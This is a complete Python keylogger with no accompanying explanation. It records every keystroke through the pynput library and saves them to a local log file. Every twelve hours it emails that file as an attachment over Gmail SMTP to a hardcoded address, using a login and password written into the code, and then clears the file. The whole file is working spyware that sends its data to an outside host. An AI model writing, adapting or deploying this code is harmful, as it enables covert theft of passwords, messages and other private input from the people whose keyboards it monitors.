from pynput.keyboard import Key, Listener 
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os

class Main: 
    def __init__(self, file_name):
        self.listener = Listener(on_press=self.key_listen)
        self.fn = file_name
        self.file = open(self.fn, 'a')
        self.keys = []
        self.count = 0
        self.key_time = 0
        self.t = Timer(1.0, self.key_timer_nit)
        self.t_mail = Timer(43200.0, self.sm_timer_logic)
        self.send_email()
        
    def sm_timer_logic(self):
        self.t_mail.cancel()
        self.send_email()
        self.t_mail = Timer(43200.0, self.sm_timer_logic)
        self.t_mail.start()

    def key_timer_nit(self):
        return

    def key_listen(self, key):
        self.key_save_timer()
       
        self.keys.append(key)
        # if key == Key.esc:
        #     return False
        self.count += 1 
        if self.count >= 10: 
            return self.key_state_clean_write()

    def key_write(self):
        with open(self.fn, 'a') as file:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write('\n')
                elif k.find("Key") == -1: 
                    file.write(k)
                elif k.find("enter") > 0:
                    file.write('<E>')

    def key_save_timer(self):
        self.t.cancel()
        self.t = Timer(10.0, self.key_state_clean_write)
        self.t.start()
        
    def key_state_clean_write(self):
        if not self.keys:
            return
        self.count = 0
        self.key_write()
        self.keys = []

    def setup(self):
        self.listener.start()

    def join(self):
        self.listener.join()

    # MAILING LOGIC 
    def send_email(self):
        message = MIMEMultipart()

        message['From'] = 'loggerdatamail@gmail.com'
        message['To'] = 'loggerdatamail@gmail.com'
        message['Subject'] = 'Logger Data'
        message.attach(MIMEText('Cpu', 'plain'))

        attachment = open(os.path.abspath(self.fn), 'rb')

        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())

        encoders.encode_base64(p)

        p.add_header('Content-Disposition', 'attachment; filename=%s' %self.fn)

        message.attach(p)

        s=smtplib.SMTP('smtp.gmail.com', 587)

        s.starttls()

        s.login('loggerdatamail@gmail.com', 'piasek1984')

        s.sendmail('loggerdatamail@gmail.com', 'loggerdatamail@gmail.com', message.as_string())
        
        s.quit()

        #clear file after mail send
        open(self.fn, 'w').close()


def main():
    Logger = Main('log')
    Logger.setup()
    Logger.join()
    
if __name__ == "__main__":
    main()
